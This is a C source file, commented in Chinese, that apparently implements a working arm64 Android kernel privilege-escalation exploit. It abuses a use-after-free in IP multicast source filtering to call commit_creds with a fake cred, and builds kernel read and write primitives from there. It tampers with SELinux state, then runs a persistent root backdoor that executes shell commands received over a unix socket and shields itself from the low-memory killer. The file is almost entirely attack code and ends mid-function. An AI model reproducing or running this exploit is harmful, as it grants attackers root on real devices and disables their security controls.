// probe31.c —— RCU 回调任意内核函数调用 + commit_creds(用户页假 cred)
//
// 关键点 (相对 probe29 的三处修正):
//
// 1) 触发点换成 ip_mc_msfilter (setsockopt IP_MSFILTER, fmode=MCAST_INCLUDE):
//      psl = pmc->sflist;
//      kfree_rcu(psl, rcu);          <-- 只 free psl, 不动 iml !
//      rcu_assign_pointer(pmc->sflist, newpsl);
//    这样 psl 可以是用户页, 不会因为 kfree(iml) 而 BUG。
//    而 kfree_call_rcu 会把 head->func 写成 8 —— 那正好写在我们的用户页里,
//    用户态随后可以把它改成任意内核函数指针 => __rcu_reclaim 走 head->func(head)。
//
// 2) 需要 head->next 非 0 (commit_creds 有 BUG_ON(usage<1), 而 usage = low32(head->next)),
//    且 head->next 必须 < 2^32 让 high32(=cred.uid) 为 0。
//    => 连续排队两个回调: psl(0x0c000200) 然后 psl2(0x0c000700)。
//       第二个的地址本身成为第一个的 next, 天然的 "用户地址"。
//
// 3) 用 commit_creds 而不是 override_creds:
//    commit_creds 里 BUG_ON(task->cred != task->real_cred),
//    而 override_creds 只改 cred 不改 real_cred, 下一次 setuid 就会 panic。
//
// 设备级组: ip_mc_add_src() 要求 in_dev->mc_list 里存在该组地址,
//   所以先用另一个 socket sb 正常 join 0x4d0100e0 把设备组"续命"。

#define COMMIT_CREDS   0xffffffc0002440ecUL
#define OVERRIDE_CREDS 0xffffffc000243f60UL
#define PATCH_PA      (0x0c000800UL)
#define PATCH_PB      (0x0c000a00UL)
#define STACK2        0x33000000UL
static volatile unsigned long g_pa, g_pb, g_fa, g_fb, g_rdy;
static unsigned long g_icsec = 0;      // init_cred->security (真实 selinux_cred)
#define RET_GADGET     0xffffffc000204a60UL   // exit_thread: 单条 ret

typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned char u8;

static inline long sysc(long n, long a, long b, long c, long d, long e, long f)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x5 __asm__("x5") = f;
    __asm__ volatile("svc #0"
        : "=r"(x0)
        : "r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
        : "memory", "cc");
    return x0;
}

#define socket_(f, t, p)        sysc(198, f, t, p, 0, 0, 0)
#define setsockopt_(fd, l, o, v, n) sysc(208, fd, l, o, (long)(v), n, 0)
#define getsockopt_(fd, l, o, v, n) sysc(209, fd, l, o, (long)(v), (long)(n), 0)
#define bind_(fd, a, n)         sysc(200, fd, (long)(a), n, 0, 0, 0)
#define listen_(fd, b)          sysc(201, fd, b, 0, 0, 0, 0)
#define accept_(fd, a, l)       sysc(202, fd, (long)(a), (long)(l), 0, 0, 0)
#define connect_(fd, a, n)      sysc(203, fd, (long)(a), n, 0, 0, 0)
#define close_(fd)              sysc(57, fd, 0, 0, 0, 0, 0)
#define openat_(p, path, f)     sysc(56, -100, (long)(path), f, 0644, 0, 0)
// ★ arm64 的 O_DIRECTORY 是 040000 (= 0x4000), 不是 asm-generic 的 00200000.
//   用 0x10000 会 -EINVAL —— 这是 purge_dir / rel_walk 长期"空转"的真凶
//   (见 2026-11-08 16:08 的对照实验: pA/pC 带 O_DIRECTORY 全 -EINVAL,
//    pB/pD 不带就成功).
#define O_DIR_ 0x4000
#define mmap_(a, l, p, f, fd, o) sysc(222, a, l, p, f, fd, o)
#define write_(fd, b, n)        sysc(64, fd, (long)(b), n, 0, 0, 0)
#define fsync_(fd)              sysc(82, fd, 0, 0, 0, 0, 0)
#define read_(fd, b, n)         sysc(63, fd, (long)(b), n, 0, 0, 0)
#define fork_()                 sysc(220, 17, 0, 0, 0, 0, 0)
#define affinity_(pid, len, m)  sysc(122, pid, len, (long)(m), 0, 0, 0)
#define getaffinity_(pid, len, m) sysc(123, pid, len, (long)(m), 0, 0, 0)
#define nanosleep_(ts)          sysc(101, (long)(ts), 0, 0, 0, 0, 0)
#define sigblock_(set)          sysc(135, 0, (long)(set), 0, 8, 0, 0)
#define exit_(c)                sysc(93, c, 0, 0, 0, 0, 0)
#define getpid_()               sysc(172, 0, 0, 0, 0, 0, 0)
#define getuid_()               sysc(174, 0, 0, 0, 0, 0, 0)
#define geteuid_()              sysc(175, 0, 0, 0, 0, 0, 0)
#define getgid_()               sysc(176, 0, 0, 0, 0, 0, 0)
#define setuid_(u)              sysc(146, u, 0, 0, 0, 0, 0)
#define setgid_(g)              sysc(144, g, 0, 0, 0, 0, 0)
#define kill_(p, s)             sysc(129, p, s, 0, 0, 0, 0)

#define PROT_READ  1
#define PROT_WRITE 2
#define MAP_PRIVATE   2
#define MAP_FIXED     0x10
#define MAP_ANONYMOUS 0x20
#define O_WRONLY 1
#define O_CREAT  0x40
#define O_TRUNC  0x200
#define AF_INET  2
#define AF_INET6 10
#define SOCK_STREAM 1
#define SOCK_DGRAM  2
#define SOCK_CLOEXEC 0x80000
#define SOL_IP   0
#define SOL_SOCKET 1
#define SOL_TCP  6
#define TCP_NODELAY 1
#define SO_RCVBUF 8
#define SOL_IPV6 41
#define IP_MSFILTER      41
#define IP_BLOCK_SOURCE  38
#define MCAST_JOIN_GROUP 42
#define MCAST_LEAVE_GROUP 45

#define FAKE_BASE  0x0c000000UL
#define P_FAKE     (FAKE_BASE + 0xff)     // fake ip_mc_socklist
#define PSL1       (FAKE_BASE + 0x200)    // 第一个 fake ip_sf_socklist
#define CRED       (PSL1 + 8)             // == head1, 假 cred
#define PSL2       (FAKE_BASE + 0x700)    // 第二个 fake ip_sf_socklist
#define FAKE_TSEC  (FAKE_BASE + 0x500)

#define INIT_TASK_A  0xffffffc001624860UL
#define INIT_CRED    0xffffffc00162dd20UL
#define OFF_CRED   0x4e0U
#define TASKS_OFF  0x2b0U
#define OFF_COMM   0x4e8U

#define RBUF_ADDR 0x30000000UL

// ===== mmap 报告通道 =====
// 提权前 open+ftruncate+mmap(MAP_SHARED); 提权后直接写内存页.
// page fault 路径不经过任何 SELinux hook, 脏页由内核 writeback 线程落盘.
#define REP_ADDR  0x0d000000UL
#define REP_SIZE  0x10000UL
#define POLICYDB  0xffffffc001880930UL
#define SS_INIT   0xffffffc001880b18UL
#define SELINUX_ENFORCING 0xffffffc00187d47cUL
#define SIDTAB    0xffffffc001880b28UL   // struct sidtab (紧跟在 ss_initialized 之后)

// type 值 (来自 tools/sepolicy_parse.py --dump-types, 与 isid 实测互相印证)
#define TYPE_KERNEL    191U
#define TYPE_UNLABELED 241U
#define TYPE_INIT      575U
#define TYPE_SHELL     1060U
#define POL_BUF 0x21000000UL
#define POL_MAX 0x200000UL
// ★ SECINITSID_INIT = 7 (initial_sid_to_string[]: 0 null,1 kernel,2 security,
//   3 unlabeled,4 fs,5 file,6 file_labels,7 init). probe78/79 用的 0x25=37
//   是开机后动态分配的 sid, 根本不是 init —— 这是之前所有 domain 实验失败的原因.
#define INIT_SID 7U


// ============ mmap 报告通道 ============
static u8 *g_rp;
static u32 g_ro;

static void rpc(char c) { if (g_rp && g_ro < REP_SIZE - 2) g_rp[g_ro++] = (u8)c; }
static void rps(const char *s) { while (*s) rpc(*s++); }
static void rph(u32 v)
{
    const char *H = "0123456789abcdef";
    for (int i = 28; i >= 0; i -= 4) rpc(H[(v >> i) & 15]);
}
static void rp64(u64 v) { rph((u32)(v >> 32)); rph((u32)v); }
static void rpnl(void) { rpc('\n'); }
static void rpsync(void) { if (g_rp) sysc(227, (long)g_rp, (long)REP_SIZE, 4, 0, 0, 0); }
static void rphex(const u8 *p, int n) { for (int i = 0; i < n; i++) rph((u32)p[i]); }

// ===== 共享页日志通道 (见 _start 里的说明) =====
#define LG_ADDR  0x0b000000UL
#define LG_SIZE  0x20000UL
#define LGH      16
static volatile u32 *g_lgh = 0;
static u8 *g_lgb = 0;

static void lgc(char c)
{
    // ★ probe96: 同时落到 mmap 报告页, 每行末尾 msync 强制回写.
    //   这条通道不经过任何辅助进程, 提权后依然可用.
    rpc(c);
    if (c == '\n') rpsync();

    if (!g_lgh) return;
    u32 o = g_lgh[0];
    if (o >= LG_SIZE - LGH - 2) return;
    g_lgb[o] = (u8)c;
    __asm__ volatile("" ::: "memory");
    g_lgh[0] = o + 1;
    g_lgh[1] = g_lgh[1] + 1;
}
static void lgs(const char *s) { while (*s) lgc(*s++); }
static void lgh_(u32 v)
{
    const char *H = "0123456789abcdef";
    for (int i = 28; i >= 0; i -= 4) lgc(H[(v >> i) & 15]);
}
static void lgnl(void) { lgc('\n'); }

// ★ probe97: 纯用户态 store 版日志 —— 一个系统调用都不发.
//   只往共享匿名页写字节, 由提权前 fork 出来的 shell 域抄写员 (5ms 轮询)
//   落盘. 用来在"完全不进内核"的前提下观察提权后的存活情况.
static void lgp(char c)
{
    if (!g_lgh) return;
    u32 o = g_lgh[0];
    if (o >= LG_SIZE - LGH - 2) return;
    g_lgb[o] = (u8)c;
    __asm__ volatile("" ::: "memory");
    g_lgh[0] = o + 1;
    g_lgh[1] = g_lgh[1] + 1;
}
static void lgps(const char *s) { while (*s) lgp(*s++); }
static void lgph(u32 v)
{
    const char *H = "0123456789abcdef";
    for (int i = 28; i >= 0; i -= 4) lgp(H[(v >> i) & 15]);
}
static void lgpnl(void) { lgp('\n'); }


static int g_sp = -1;
// ★ 步骤落盘: fd 在提权前打开, 之后每步 write+fsync.
//   硬复位后 step.txt 仍在, 可以看到最后走到哪一步.
static void stp(const char *s)
{
    if (g_sp < 0) return;
    while (*s) { sysc(64, g_sp, (long)s, 1, 0, 0, 0); s++; }
    sysc(64, g_sp, (long)"\n", 1, 0, 0, 0);
    sysc(82, g_sp, 0, 0, 0, 0, 0);
    lgs(s); lgnl();
}

static long rp_open(void)
{
    long fd = sysc(56, -100, (long)"/data/local/tmp/rep.bin",
                   2 | 0x40 | 0x200, 0644, 0, 0);          // O_RDWR|O_CREAT|O_TRUNC
    if (fd < 0) return -1;
    if (sysc(46, fd, (long)REP_SIZE, 0, 0, 0, 0) != 0) return -2;   // ftruncate
    long a = mmap_(REP_ADDR, REP_SIZE, PROT_READ | PROT_WRITE,
                   1 | MAP_FIXED, fd, 0);                    // MAP_SHARED|MAP_FIXED
    if (a != (long)REP_ADDR) return -3;
    g_rp = (u8 *)REP_ADDR;
    g_ro = 0;
    return 0;
}

static int g_ser = -1;
static u8 *const g_rbuf = (u8 *)RBUF_ADDR;

static void puts_(const char *s, long n) { write_(1, s, n); }
static void mark(char c) { write_(1, &c, 1); fsync_(1); }

// ---- /proc/self/attr/current 读写 (按名字换 SELinux 域) ----
static long sl_(const char *s) { long n = 0; while (s[n]) n++; return n; }
static long setcon_(const char *ctx)
{
    int f = openat_(-100, "/proc/self/attr/current", O_WRONLY);
    long r = -1;
    if (f >= 0) { r = write_(f, ctx, sl_(ctx)); close_(f); }
    return r;
}
static long getcon_(char *buf, int n)
{
    int f = openat_(-100, "/proc/self/attr/current", 0);
    long r = -1;
    if (n > 0) buf[0] = 0;
    if (f >= 0) { r = read_(f, buf, n); close_(f); }
    if (r > 0) {
        for (long i = 0; i < r; i++)
            if (buf[i] == '\n' || buf[i] == 0) { buf[i] = 0; break; }
    }
    return r;
}


static void ph(u32 v)
{
    char b[8];
    for (int i = 7; i >= 0; i--) {
        u32 n = v & 0xf;
        b[i] = n < 10 ? '0' + n : 'a' + n - 10;
        v >>= 4;
    }
    write_(1, b, 8);
}

// ★ 必须拆成 sec/nsec: tv_nsec > 999999999 时 nanosleep 直接返回 -EINVAL,
//   而 hang() 里正好 sleepms(1000) -> 1e9 -> 立即返回 -> 死循环烧满一核。
static void sleepms(int ms)
{
    long ts[2];
    ts[0] = (long)ms / 1000;
    ts[1] = (long)(ms % 1000) * 1000000;
    nanosleep_(ts);
}

static void hang(void) { for (;;) sleepms(1000); }

// ===== 常驻 root 命令服务 =====
// 提权后 (euid=0 + securebits 已清) fork 出来的子进程跑 exec, 内核会自动
// 把 cap_permitted 设成 bset|inh 且 effective=permitted —— 所以这里 exec
// 出来的 sh 天生就是满 caps 的 root, 不需要再打补丁.
struct zsun { unsigned short f; char p[110]; };

static void serve_root(void)
{
    const char *nm = "z5rootd";
    int nl = 0; while (nm[nl]) nl++;

    // ★ 2026-11-11: fork-per-request 但从不回收 -> 每条 su 留一个 zombie。
    //   置 SIGCHLD=SIG_IGN, 让内核对退出的子进程直接回收。
    {
        struct { unsigned long h, fl, rs, mk; } sa2;
        sa2.h = 1; sa2.fl = 0; sa2.rs = 0; sa2.mk = 0;
        long r = sysc(134, 17, (long)&sa2, 0, 8, 0, 0);  // rt_sigaction(SIGCHLD)
        rps("D sigchld "); rph((u32)r); rpnl(); rpsync();
    }

    int sk = (int)sysc(198, 1, 1, 0, 0, 0, 0);        // socket(AF_UNIX, STREAM)
    if (sk < 0) { rps("D sk-fail "); rph((u32)sk); rpnl(); rpsync(); return; }

    struct zsun sa;
    for (unsigned i = 0; i < sizeof(sa); i++) ((char *)&sa)[i] = 0;
    sa.f = 1;
    for (int i = 0; i < nl; i++) sa.p[1 + i] = nm[i];

    long b = sysc(200, sk, (long)&sa, 2 + 1 + nl, 0, 0, 0);   // bind
    if (b != 0) { rps("D bind-fail "); rph((u32)b); rpnl(); rpsync(); return; }
    sysc(201, sk, 16, 0, 0, 0, 0);                     // listen
    rps("D up\n"); rpsync();

    for (;;) {
        long c = sysc(202, sk, 0, 0, 0, 0, 0);         // accept
        if (c < 0) { sleepms(50); continue; }
        long p = fork_();
        if (p == 0) {
            sysc(24, c, 0, 0, 0, 0, 0);                // dup3(c,0,0)
            sysc(24, c, 1, 0, 0, 0, 0);                // dup3(c,1,0)
            sysc(24, c, 2, 0, 0, 0, 0);                // dup3(c,2,0)
            if (c > 2) sysc(57, c, 0, 0, 0, 0, 0);
            char buf[768];
            int n = 0;
            for (;;) {
                char ch;
                long r = sysc(63, 0, (long)&ch, 1, 0, 0, 0);
                if (r <= 0) break;
                if (ch == '\n') break;
                if (ch != '\r' && n < 760) buf[n++] = ch;
            }
            buf[n] = 0;
            if (n == 0) sysc(93, 0, 0, 0, 0, 0, 0);
            char *av[4];
            av[0] = (char *)"sh";
            av[1] = (char *)"-c";
            av[2] = buf;
            av[3] = 0;
            sysc(221, (long)"/system/bin/sh", (long)av, 0, 0, 0, 0);
            sysc(93, 127, 0, 0, 0, 0, 0);
        }
        if (c > 2) sysc(57, c, 0, 0, 0, 0, 0);
        if (p < 0) sleepms(50);
    }
}

// ================= 自保护 (probe70 v3) =================
// ★ 2026-11-08 18:10 用户实测: root 之后"一打开多任务界面就卡死重启".
//   多任务界面要分配不少内存, 2GB 的机器必然触发 LMK 回收; 一旦 LMK 选中
//   持 UAF 的这个进程, 进程被 SIGKILL -> exit_files -> ip_mc_drop_socket
//   -> 对用户页里的 fake pmc 做 kfree -> panic 重启.
//   所以这里给自己上两道锁:
//     1) setsid: 脱离 App 的 session / 进程组, 免得 App 被按组杀时连坐;
//     2) oom_score_adj = -1000: LMK 永远不会选中它 (需要 CAP_SYS_RESOURCE,
//        此刻是 fake 全 caps, 有).
static void protect_self(void)
{
    sysc(157, 0, 0, 0, 0, 0, 0);                 // setsid
    int f = openat_(-100, "/proc/self/oom_score_adj", O_WRONLY);
    if (f >= 0) {
        write_(f, "-1000", 5);
        close_(f);
        rps("P oom -1000\n");
    } else {
        int g = openat_(-100, "/proc/self/oom_adj", O_WRONLY);
        if (g >= 0) { write_(g, "-17", 3); close_(g); rps("P adj -17\n"); }
        else { rps("P oomfail "); rph((u32)f); rpnl(); }
    }
    rpsync();
}

static void greq_v4(char *g, u32 ifidx, u32 ip_be)
{
    for (int i = 0; i < 136; i++) g[i] = 0;
    g[0] = (char)ifidx; g[1] = (char)(ifidx >> 8);
    g[8] = 2;
    g[12] = (char)(ip_be >> 24);
    g[13] = (char)(ip_be >> 16);
    g[14] = (char)(ip_be >> 8);
    g[15] = (char)ip_be;
}

static void greq_v6(char *g, u32 t)
{
    for (int i = 0; i < 136; i++) g[i] = 0;
    g[0] = 1;
    g[8] = 10;
    g[16] = 0xff;
    g[19] = 0x0c;
    g[24] = (char)t; g[25] = (char)(t >> 8);
    g[26] = (char)(t >> 16); g[27] = (char)(t >> 24);
    g[28] = 0x7f; g[29] = 0; g[30] = 0; g[31] = 1;
}

static long kread2(u64 target, u32 want)
{
    volatile u32 *h = (volatile u32 *)g_rbuf;
    volatile int olen;
    *(volatile u64 *)(P_FAKE + 24) = target - 24;
    *(volatile u32 *)(P_FAKE + 16) = 1;
    *(volatile u32 *)(P_FAKE + 20) = 0;
    h[0] = 0x4d0100e0;
    h[1] = 0x0100007f;
    h[2] = 1;
    h[3] = want >> 2;
    olen = (int)(16 + want);
    long r = getsockopt_(g_ser, SOL_IP, IP_MSFILTER, g_rbuf, &olen);
    if (r != 0) return -1;
    int c = (olen - 12) >> 2;
    if (c < 0) c = 0;
    long n = (long)c * 4;
    if (n > (long)want) n = (long)want;
    return n;
}

static long kread_at(u64 base, u32 want)
{
    u8 *p = (u8 *)(g_rbuf + 16);
    for (u32 d = 0; d < 0x60; d += 4) {
        long n = kread2(base - d, want + d);
        if (n >= (long)(want + d)) {
            for (u32 i = 0; i < want; i++) p[i] = p[d + i];
            return (long)want;
        }
    }
    return -1;
}

static void kdump(u64 base, u32 len)
{
    for (u32 o = 0; o < len; o += 0x20) {
        rph(o); rps("  ");
        if (kread_at(base + o, 0x20) == 0x20)
            rphex((const u8 *)(g_rbuf + 16), 0x20);
        else
            rps("READFAIL");
        rpnl();
        rpsync();
    }
}

static u64 rd64(const u8 *p)
{
    u64 v = 0;
    for (int i = 7; i >= 0; i--) v = (v << 8) | p[i];
    return v;
}

static int isk(u64 v) { return (v >> 40) == 0xffffff; }

// 更严的内核指针判据 (probe82): 高位必须是 0xffffff80..0xffffffff, 且不是 -1
static int kptr(u64 v)
{
    u32 h = (u32)(v >> 32);
    if (h < 0xffffff80UL) return 0;
    if (v == 0xffffffffffffffffUL) return 0;
    return 1;
}

static void p64(u64 v) { ph((u32)(v >> 32)); ph((u32)v); }


// 4 字节内核写: ip_mc_source 的 sl_addr[i] 写入, i = psl->sl_count
// 约束: psl = W - 24 - 4k, psl->sl_count == k < 10, psl->sl_max != k
// 副作用: *(u32*)(W - 20 - 4k) += 1
static long kread_at2(u64 base, u32 want)
{
    u8 *p = (u8 *)(g_rbuf + 16);
    for (u32 d = 0; d < 0x800; d += 4) {
        long n = kread2(base - d, want + d);
        if (n >= (long)(want + d)) {
            for (u32 i = 0; i < want; i++) p[i] = p[d + i];
            return (long)want;
        }
    }
    return -1;
}

static void dumpone(const char *path, const char *tag)
{
    int f = openat_(-100, path, 0);
    if (f < 0) { rps(tag); rps(" open-fail"); rpnl(); rpsync(); return; }
    char b[1024];
    long n = read_(f, b, 1000);
    close_(f);
    if (n <= 0) { rps(tag); rps(" read-fail"); rpnl(); rpsync(); return; }
    for (long i = 0; i + 4 < n; i++) {
        int hit = 0;
        if (b[i]=='N'&&b[i+1]=='a'&&b[i+2]=='m'&&b[i+3]=='e') hit = 1;
        if (b[i]=='U'&&b[i+1]=='i'&&b[i+2]=='d'&&b[i+3]==':') hit = 1;
        if (b[i]=='G'&&b[i+1]=='i'&&b[i+2]=='d'&&b[i+3]==':') hit = 1;
        if (b[i]=='C'&&b[i+1]=='a'&&b[i+2]=='p'&&b[i+3]=='P') hit = 1;
        if (b[i]=='C'&&b[i+1]=='a'&&b[i+2]=='p'&&b[i+3]=='E') hit = 1;
        if (b[i]=='C'&&b[i+1]=='a'&&b[i+2]=='p'&&b[i+3]=='B') hit = 1;
        if (!hit) continue;
        rps(tag); rps(" ");
        long j = i;
        while (j < n && b[j] != '\n' && j < i + 40) { rpc(b[j]); j++; }
        rpnl();
    }
    rpsync();
}

static void ustat(const char *tag) { dumpone("/proc/self/status", tag); }

static void pstat(long pid, const char *tag)
{
    char p[40];
    int k = 0;
    const char *pre = "/proc/";
    while (*pre) p[k++] = *pre++;
    char t[12]; int d = 0;
    long v = pid;
    if (v == 0) t[d++] = '0';
    while (v > 0) { t[d++] = (char)('0' + (int)(v % 10)); v /= 10; }
    while (d > 0) p[k++] = t[--d];
    const char *suf = "/status";
    while (*suf) p[k++] = *suf++;
    p[k] = 0;
    dumpone(p, tag);
}

static u64 kread64(u64 a)
{
    if (kread_at(a, 8) != 8) return 0;
    return *(volatile u64 *)(g_rbuf + 16);
}

static long kwrite(u64 W, u32 val, u32 *out_k)
{
    if (kread_at(W - 0x40, 0x40) != 0x40) return -1000;
    u8 *p = (u8 *)(g_rbuf + 16);
    char mrs[12];
    for (int k = 0; k <= 9; k++) {
        u64 S = W - 24 - 4 * (u64)k;
        long off = (long)(S - (W - 0x40));
        if (off < 0 || off + 8 > 0x40) continue;
        u32 mx = *(u32 *)(p + off);
        u32 ct = *(u32 *)(p + off + 4);
        if (ct != (u32)k) continue;
        if (mx == (u32)k) continue;
        mrs[0] = (char)0xe0; mrs[1] = 0; mrs[2] = 1; mrs[3] = 0x4d;
        mrs[4] = 127; mrs[5] = 0; mrs[6] = 0; mrs[7] = 1;
        mrs[8]  = (char)(val & 0xff);
        mrs[9]  = (char)((val >> 8) & 0xff);
        mrs[10] = (char)((val >> 16) & 0xff);
        mrs[11] = (char)((val >> 24) & 0xff);
        *(volatile u64 *)(P_FAKE + 24) = S;
        *(volatile u32 *)(P_FAKE + 16) = 1;
        *(volatile u32 *)(P_FAKE + 20) = 0;
        long r = setsockopt_(g_ser, SOL_IP, IP_BLOCK_SOURCE, mrs, 12);
        if (out_k) *out_k = (u32)k;
        return r;
    }
    return -2000;
}

// ===== 通用 "把 target 处的 u32 减 1" 原语 =====
// 走 IP_UNBLOCK_SOURCE(37) -> ip_mc_source(add=0) 的删除分支:
//   psl->sl_count 就是 *(u32*)(target) 本身, 必须 == 1
//   （此时 for (j=0; j<sl_count-1; j++) 空转, 不会顺带写 sl_addr[0]）
//   src 必须等于 *(u32*)(target+0x10) = sl_addr[0], 否则返回 -ESRCH
// 用法: 1 -> 0. 目标值不是 1 时千万不要调, 会把 0 减成 0xffffffff.
static long kdec(u64 target)
{
    u64 S = target - 4;
    u32 sv = 0xdeadbeef;
    if (kread_at2(S + 24, 4) == 4) sv = *(u32 *)(g_rbuf + 16);
    char mrs[12];
    mrs[0] = (char)0xe0; mrs[1] = 0; mrs[2] = 1; mrs[3] = 0x4d;
    mrs[4] = 127; mrs[5] = 0; mrs[6] = 0; mrs[7] = 1;
    mrs[8]  = (char)(sv      ); mrs[9]  = (char)(sv >> 8);
    mrs[10] = (char)(sv >> 16); mrs[11] = (char)(sv >> 24);
    *(volatile u64 *)(P_FAKE + 24) = S;
    *(volatile u32 *)(P_FAKE + 16) = 1;
    *(volatile u32 *)(P_FAKE + 20) = 0;
    return setsockopt_(g_ser, SOL_IP, 37, mrs, 12);
}

static long kfind_k(u64 W, u32 *out_k)
{
    if (kread_at(W - 0x40, 0x40) != 0x40) return -1000;
    u8 *p = (u8 *)(g_rbuf + 16);
    for (int k = 0; k <= 9; k++) {
        u64 S = W - 24 - 4 * (u64)k;
        long off = (long)(S - (W - 0x40));
        if (off < 0 || off + 8 > 0x40) continue;
        u32 mx = *(u32 *)(p + off);
        u32 ct = *(u32 *)(p + off + 4);
        if (ct != (u32)k) continue;
        if (mx == (u32)k) continue;
        *out_k = (u32)k;
        return k;
    }
    return -1;
}

// 整读一个文件到指定用户地址; 返回 >=0 字节数, <0 表示 open/read 错误
static long slurp(const char *path, u64 buf, long max)
{
    int f = openat_(-100, path, 0);
    if (f < 0) return (long)f;
    long off = 0;
    for (int i = 0; i < 400; i++) {
        long n = read_(f, (void *)(buf + (u64)off), 0x4000);
        if (n <= 0) break;
        off += n;
        if (off > max - 0x20000) break;
    }
    close_(f);
    return off;
}

static void set_tsec(u64 cred, u64 page, u32 osid, u32 sid)
{
    for (int i = 0; i < 24; i++) *(volatile u8 *)(page + i) = 0;
    *(volatile u32 *)(page + 0) = osid;
    *(volatile u32 *)(page + 4) = sid;
    *(volatile u64 *)(cred + 0x70) = page;
}

// ================= relabel 自愈 (probe70 新增) =================
// 只对"当前标签是 unlabeled 或完全没有 security.selinux xattr"的条目重打标签,
// 已有正常标签的一律不碰 (packages.xml 等关键文件绝不受影响).
// 前提: enforce=0 (permissive) + fake cred 全 caps (CAP_MAC_ADMIN)
//       + ss_initialized=1 (policy 已回灌, security_context_to_sid 可用).
static int rel_ok = 0, rel_fail = 0, rel_dfail = 0;
static long rel_n = 0;
// 1 = 不判断当前标签, 直接重打 (只对"确定该是什么标签"的固定目录用)
static int rel_force = 0;

static const char XATTR_SEL[] = "security.selinux";
static const char CTX_SYSTEM[]  = "u:object_r:system_data_file:s0";
static const char CTX_APPDATA[] = "u:object_r:app_data_file:s0:c512,c768";
// /idd (diag 分区) 与 /rca (apps_log 分区): iddd 每秒多次往这里写遥测,
// 一旦被污染成 unlabeled, 写失败会疯狂产生 avc -> 把内核日志环形缓冲区刷爆.
static const char CTX_IDD[]     = "u:object_r:idd_data_file:s0";
static const char CTX_RCA[]     = "u:object_r:idd_rca_file:s0";
// /data/camera: mm-qcamera-daemon 的 socket 目录, file_contexts 里是
//   /data/camera(/.*)?  u:object_r:camera_socket:s0
// 一旦 unlabeled, daemon unlink(socket) 被拒 -> 相机 App 报 "Fail to get camera info".
static const char CTX_CAMERA[]  = "u:object_r:camera_socket:s0";
static const char CTX_CAMD[]    = "u:object_r:camera_data_file:s0";

// 1 = 递归时不进 cache/code_cache 目录 (体积大且丢了也无害)
static int rel_skipcache = 0;

// 1 = 需要 relabel (unlabeled 或无 xattr), 0 = 标签正常
static int is_unlabeled(const char *path)
{
    static char v[128];
    long n = sysc(9, (long)path, (long)XATTR_SEL, (long)v, 128, 0, 0);  // lgetxattr
    if (n <= 0) return 1;                       // 无 xattr (窗口期新建) -> 需要
    const char *u = "u:object_r:unlabeled:s0";
    if (n != 23) return 0;
    for (int i = 0; i < 23; i++) if (v[i] != u[i]) return 0;
    return 1;
}

static int rel_set(const char *path, const char *ctx)
{
    int n = 0;
    while (ctx[n]) n++;
    long r = sysc(6, (long)path, (long)XATTR_SEL, (long)ctx, n, 0, 0);  // lsetxattr
    if (r == 0) { rel_ok++; return 0; }
    rel_fail++;
    return -1;
}

// 递归遍历目录, 给 unlabeled 条目重打 ctx 标签. dt: 4=dir, 0=unknown 也尝试递归.
static void rel_walk(const char *dir, const char *ctx, int depth, int maxd)
{
    if (depth > maxd || rel_n > 60000) return;
    char db[2048];
    int df = openat_(-100, dir, 0x4000);       // O_DIRECTORY
    if (df < 0) { rel_dfail++; return; }
    long n;
    while ((n = sysc(61, df, (long)db, 2048, 0, 0, 0)) > 0) {   // getdents64
        long o = 0;
        while (o + 19 <= n) {
            unsigned short rl = *(unsigned short *)(db + o + 16);
            unsigned char  dt = *(unsigned char  *)(db + o + 18);
            unsigned char *nm = (unsigned char *)(db + o + 19);
            if (rl < 20) break;
            if (!(nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0)))) {
                char fp[512];
                int k = 0, j = 0;
                while (dir[k] && k < 400) { fp[k] = dir[k]; k++; }
                if (k > 0 && fp[k - 1] != '/') fp[k++] = '/';
                while (nm[j] && k < 480) fp[k++] = (char)nm[j++];
                fp[k] = 0;
                rel_n++;
                if ((rel_n & 0xfff) == 0) {          // 每 4096 条打一次进度
                    rps("K n "); rph((u32)rel_n); rps(" ok "); rph((u32)rel_ok);
                    rpnl(); rpsync();
                }
                if (rel_force || is_unlabeled(fp)) rel_set(fp, ctx);
                int skip = 0;
                if (rel_skipcache) {
                    const char *cc = "cache";
                    int ci = 0;
                    while (cc[ci] && nm[ci] == (unsigned char)cc[ci]) ci++;
                    if (!cc[ci]) skip = 1;                 // 名字正好是 cache
                }
                if ((dt == 4 || dt == 0) && depth < maxd && !skip)
                    rel_walk(fp, ctx, depth + 1, maxd);
            }
            o += rl;
        }
    }
    close_(df);
}

// 存在性检查: 用 openat(O_DIRECTORY) 试开.
// ★ 2026-11-08 15:47 教训: 原来用 newfstatat(fd, path, NULL, 0) —— statbuf 传 NULL
//   内核直接 -EFAULT, 于是每个根目录都被判定"不存在", K rel n 恒为 0 (空转).
static int path_exists(const char *p)
{
    int f = openat_(-100, p, 0x4000);
    if (f < 0) return 0;
    close_(f);
    return 1;
}

// 文件存在性检查 (O_RDONLY; path_exists 用 O_DIRECTORY 对文件必然 -ENOTDIR)
static int file_exists(const char *p)
{
    int f = openat_(-100, p, 0);
    if (f < 0) return 0;
    close_(f);
    return 1;
}

// 清空一个目录里的所有普通文件 (Recents 缓存). 纯系统调用, 无 fork.
// 调用前提: 当前 tsec 的 sid 对该目录/文件有足够权限 (先做 sid 扫描).
static int purge_dir(const char *dir)
{
    int cnt = 0;
    for (int pass = 0; pass < 8; pass++) {
        char db[2048];
        static char fp[160];
        int df = openat_(-100, dir, 0x4000);
        if (df < 0) break;
        long n;
        while ((n = sysc(61, df, (long)db, 2048, 0, 0, 0)) > 0) {
            long o = 0;
            while (o + 19 <= n) {
                unsigned short rl = *(unsigned short *)(db + o + 16);
                unsigned char *nm = (unsigned char *)(db + o + 19);
                if (rl < 20) break;
                if (!(nm[0] == '.' && (nm[1] == 0 ||
                      (nm[1] == '.' && nm[2] == 0)))) {
                    int k = 0, j = 0;
                    while (dir[k]) { fp[k] = dir[k]; k++; }
                    if (k > 0 && fp[k-1] != '/') fp[k++] = '/';
                    while (nm[j] && k < 150) { fp[k++] = (char)nm[j++]; }
                    fp[k] = 0;
                    sysc(35, -100, (long)fp, 0, 0, 0, 0);
                    cnt++;
                }
                o += rl;
            }
        }
        close_(df);
        if (cnt == 0) break;
    }
    return cnt;
}

static void prn(const u8 *p, int n)
{
    char b[32];
